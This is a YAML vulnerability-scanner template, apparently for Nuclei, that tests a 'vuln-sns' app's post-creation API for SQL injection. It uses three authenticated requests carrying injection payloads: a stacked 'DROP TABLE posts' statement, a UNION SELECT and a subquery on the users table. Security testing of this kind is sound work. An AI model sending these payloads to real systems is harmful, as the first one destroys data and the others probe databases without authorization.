id: vuln-sns-posts-post-sql-injection

info:
  name: vuln-sns Posts POST SQL Injection
  author: devin
  severity: high
  description: SQL injection vulnerability in post creation endpoint due to unsafe string concatenation
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-89
  metadata:
    max-request: 3
  tags: sqli,posts,post,vuln-sns,authenticated

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/posts"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer alice_token"
    
    body: |
      {
        "content": "test'); DROP TABLE posts; -- "
      }
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "SQL syntax"
          - "near"
        condition: or
        part: body
        case-insensitive: true
      
      - type: status
        status:
          - 500

  - method: POST
    path:
      - "{{BaseURL}}/api/posts"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer alice_token"
    
    body: |
      {
        "content": "test' UNION SELECT 1,2,3,4,5,6,7 -- "
      }
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "union"
          - "select"
        condition: or
        part: body
        case-insensitive: true
      
      - type: status
        status:
          - 500

  - method: POST
    path:
      - "{{BaseURL}}/api/posts"
    
    headers:
      Content-Type: application/json
      Authorization: "Bearer bob_token"
    
    body: |
      {
        "content": "test' AND (SELECT COUNT(*) FROM users) > 0 -- "
      }
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "syntax error"
          - "mysql"
          - "SQL syntax"
          - "near"
        condition: or
        part: body
        case-insensitive: true
      
      - type: status
        status:
          - 500
